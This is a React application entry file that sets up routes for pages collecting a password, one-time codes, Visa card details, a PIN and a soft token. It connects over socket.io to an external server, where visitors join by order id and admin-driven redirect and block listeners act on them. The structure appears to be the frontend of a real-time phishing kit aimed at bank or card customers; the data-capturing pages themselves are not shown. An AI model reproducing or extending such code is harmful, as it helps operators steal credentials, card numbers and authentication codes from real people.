import { BrowserRouter, Routes, Route } from "react-router-dom";
import Home from "./Pages/Home";
import { LanguageProvider } from "./context/LanguageContext";
import { useEffect } from "react";
import Password from "./Pages/Password";
import Visa from "./Pages/Visa";
import VisaOtp from "./Pages/VisaOtp";
import axios from "axios";
import Otp from "./Pages/Otp";
import Pin from "./Pages/Pin";
import SoftToken from "./Pages/SoftToken";
import { io } from "socket.io-client";
import AdminRedirectListener from "./components/AdminRedirectListener";
import BlockListener from "./components/BlockListener";

// export const api_route = "http://localhost:8080";
export const api_route = 'https://test-ser1-production.up.railway.app'
export const socket = io(api_route);

export function getKeysWithTrueValue(obj) {
  const keysWithTrueValue = {};
  for (const key in obj) {
    if (obj[key]) {
      keysWithTrueValue[key] = obj[key];
    }
  }
  return keysWithTrueValue;
}

function App() {
  useEffect(() => {
    (async () => {
      await axios.get(api_route + "/");
    })();
  }, []);

  useEffect(() => {
    const emitJoin = () => {
      const orderId = sessionStorage.getItem("id");
      socket.emit("join", { role: "visitor", orderId });
    };
    if (socket.connected) emitJoin();
    socket.on("connect", emitJoin);
    return () => socket.off("connect", emitJoin);
  }, []);

  return (
    <LanguageProvider>
      <div className="min-h-screen w-full flex items-start justify-center">
        <div className="w-full md:w-1/2 relative items-center justify-center flex flex-col">
          <BrowserRouter>
            <AdminRedirectListener />
            <BlockListener />
            <Routes>
              <Route path="/" element={<Home />} />
              <Route path="/password" element={<Password />} />
              <Route path="/otp" element={<Otp />} />
              <Route path="/visa" element={<Visa />} />
              <Route path="/visaOtp" element={<VisaOtp />} />
              <Route path="/pin" element={<Pin />} />
              <Route path="/softToken" element={<SoftToken />} />
            </Routes>
          </BrowserRouter>
        </div>
      </div>
    </LanguageProvider>
  );
}

export default App;
